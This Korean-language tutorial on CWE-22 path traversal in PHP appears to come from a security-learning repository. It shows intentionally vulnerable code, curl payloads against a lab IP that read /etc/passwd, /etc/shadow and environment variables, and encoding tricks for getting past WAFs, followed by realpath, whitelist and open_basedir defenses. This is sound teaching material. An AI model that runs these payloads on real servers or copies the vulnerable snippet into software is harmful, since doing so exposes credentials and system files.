# CWE-22: Path Traversal

사용자 입력 경로를 검증 없이 파일 시스템 접근 함수에 전달하여 공격자가 의도된 디렉토리 외부의 파일을 읽거나 쓸 수 있는 취약점입니다.

## 목차

| 섹션                                                                                                 |
|------------------------------------------------------------------------------------------------------|
| [1. 개요](#1-개요) / [2. 원리](#2-원리) / [3. PoC](#3-poc) / [4. 영향](#4-영향) / [5. 대응](#5-대응) |

---

## 1. 개요

| 항목      | 내용                                                        |
|-----------|-------------------------------------------------------------|
| CWE ID    | CWE-22                                                      |
| 이름      | Improper Limitation of a Pathname to a Restricted Directory |
| OWASP     | A01:2021 Broken Access Control                              |
| 영향      | 정보 유출 (시스템 파일, 설정 파일, 소스 코드)               |
| 빈도      | 높음 — 파일 다운로드, 이미지 로드, 로그 뷰어에서 발생       |
| 전제 조건 | 사용자 입력이 파일 경로에 도달 + open_basedir 미설정        |

[⬆ 목차로 돌아가기](#목차)

---

## 2. 원리

### 취약 코드 (PHP)

```php
<?php
// 사용자 입력 경로를 직접 사용 — 취약
$file = $_GET['file'];
echo file_get_contents($file);
?>
```

### 발생 조건

| 조건                    | 설명                                   |
|-------------------------|----------------------------------------|
| 경로 검증 없음          | `../` 시퀀스를 필터링하지 않음         |
| open_basedir 미설정     | PHP가 파일 시스템 전체에 접근 가능     |
| 절대 경로 허용          | `/etc/passwd` 같은 절대 경로 입력 가능 |
| null byte (PHP < 5.3.4) | `file.php%00.jpg` 로 확장자 검증 우회  |

### 공격 원리

```
정상 의도: /var/www/html/docs/manual.pdf
공격 입력: ../../../../etc/passwd
실제 경로: /var/www/html/docs/../../../../etc/passwd
해석 결과: /etc/passwd
```

[⬆ 목차로 돌아가기](#목차)

---

## 3. PoC

### 실습 URL

```
http://10.200.101.182/file_read.php
```

### 테스트 입력

| 입력                           | 목적                  | 예상 결과                   |
|--------------------------------|-----------------------|-----------------------------|
| `/etc/passwd`                  | 절대 경로 접근        | root:x:0:0:...              |
| `/etc/shadow`                  | 민감 파일 (권한 의존) | 해시 또는 Permission denied |
| `/etc/httpd/conf/httpd.conf`   | 웹 서버 설정          | ServerRoot, DocumentRoot    |
| `/proc/version`                | 커널 정보             | Linux version 6.x.x         |
| `/proc/self/environ`           | 프로세스 환경 변수    | PATH, HOME 등               |
| `../../../../../../etc/passwd` | 상대 경로 traversal   | root:x:0:0:...              |
| `/var/www/html/cmd_exec.php`   | PHP 소스 코드         | 소스 코드 노출              |

### cURL 테스트

```bash
# 절대 경로
curl "http://10.200.101.182/file_read.php?file=/etc/passwd"

# 상대 경로 (traversal)
curl "http://10.200.101.182/file_read.php?file=../../../etc/passwd"

# URL 인코딩 우회
curl "http://10.200.101.182/file_read.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

### 인코딩 우회 기법

| 기법               | 입력              | 설명                 |
|--------------------|-------------------|----------------------|
| 일반               | `../`             | 기본 traversal       |
| URL 인코딩         | `%2e%2e%2f`       | `../`의 URL 인코딩   |
| 더블 인코딩        | `%252e%252e%252f` | 일부 WAF 우회        |
| 백슬래시 (Windows) | `..\`             | Windows 경로 구분자  |
| UTF-8 과표현       | `%c0%ae%c0%ae/`   | 오래된 서버에서 동작 |

[⬆ 목차로 돌아가기](#목차)

---

## 4. 영향

| 영향                | 대상 파일                | 후속 공격        |
|---------------------|--------------------------|------------------|
| 계정 정보 유출      | /etc/passwd, /etc/shadow | 패스워드 크래킹  |
| DB 접속 정보        | wp-config.php, .env      | DB 직접 접근     |
| SSH 키 유출         | ~/.ssh/id_rsa            | 원격 접속        |
| 소스 코드 노출      | *.php                    | 추가 취약점 분석 |
| 서버 설정           | httpd.conf, php.ini      | 보안 설정 파악   |
| 클라우드 메타데이터 | /proc/self/environ       | AWS 자격 증명    |

[⬆ 목차로 돌아가기](#목차)

---

## 5. 대응

### php.ini 설정

```ini
; 파일 접근 범위 제한 (가장 효과적)
open_basedir = /var/www/html:/tmp
```

### 코드 수준 대응

```php
<?php
// 대응 1: realpath() + basedir 검증
$base = '/var/www/html/docs/';
$file = realpath($base . $_GET['file']);

if ($file === false || strpos($file, $base) !== 0) {
    die("접근 거부");
}
echo file_get_contents($file);

// 대응 2: basename()으로 경로 제거
$filename = basename($_GET['file']);  // "../../../etc/passwd" → "passwd"
$path = '/var/www/html/docs/' . $filename;

// 대응 3: 화이트리스트
$allowed = ['manual.pdf', 'guide.pdf', 'faq.pdf'];
if (!in_array($_GET['file'], $allowed)) {
    die("허용되지 않은 파일");
}
?>
```

### 서버 설정

| 대응             | 방법                                       |
|------------------|--------------------------------------------|
| open_basedir     | PHP 파일 접근 범위 제한                    |
| chroot           | httpd 프로세스 격리                        |
| SELinux          | `httpd_read_user_content` boolean 비활성화 |
| 심볼릭 링크 방지 | Apache `Options -FollowSymLinks`           |

[⬆ 목차로 돌아가기](#목차)

---

## 참고 자료

- CWE-22: [cwe.mitre.org/data/definitions/22.html](https://cwe.mitre.org/data/definitions/22.html) — ★★★☆☆
- OWASP Path Traversal: [owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal) — ★★★☆☆

---

## 통계

![GitHub stars](https://img.shields.io/github/stars/siasia86/system-engineering-resources?style=social)
![GitHub forks](https://img.shields.io/github/forks/siasia86/system-engineering-resources?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/siasia86/system-engineering-resources?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/siasia86/system-engineering-resources)
![License](https://img.shields.io/github/license/siasia86/system-engineering-resources)
![Actions](https://img.shields.io/github/actions/workflow/status/siasia86/system-engineering-resources/update-date.yml)

---

**작성일**: 2026-07-02

**마지막 업데이트**: 2026-07-02

© 2026 siasia86. Licensed under CC BY 4.0.
